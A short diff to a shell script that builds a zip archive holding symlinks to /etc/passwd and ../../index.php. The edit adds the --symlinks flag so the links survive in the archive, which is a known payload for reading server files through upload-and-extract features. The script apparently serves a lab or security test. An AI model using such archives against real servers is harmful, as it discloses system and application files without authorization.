@@ -8,6 +8,6 @@ done
 ln -s /etc/passwd passwd
 ln -s ../../index.php index
 
-zip cmd.zip testfile.txt passwd index
+zip --symlinks cmd.zip testfile.txt passwd index
 
 rm passwd index testfile.txt
